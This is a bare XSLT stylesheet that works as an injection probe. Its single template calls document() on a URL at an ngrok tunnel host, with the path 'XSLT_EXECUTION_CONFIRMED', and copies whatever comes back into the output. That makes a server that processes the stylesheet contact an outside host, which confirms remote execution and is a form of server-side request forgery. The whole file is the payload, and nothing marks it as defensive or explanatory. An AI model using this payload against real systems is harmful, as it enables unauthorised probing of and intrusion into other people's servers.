<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="debug" select="document('https://ebkr.heracross.reciber.owo.ngrok.pizza/XSLT_EXECUTION_CONFIRMED')"/>
    <status>
      <xsl:copy-of select="$debug"/>
    </status>
  </xsl:template>
</xsl:stylesheet>
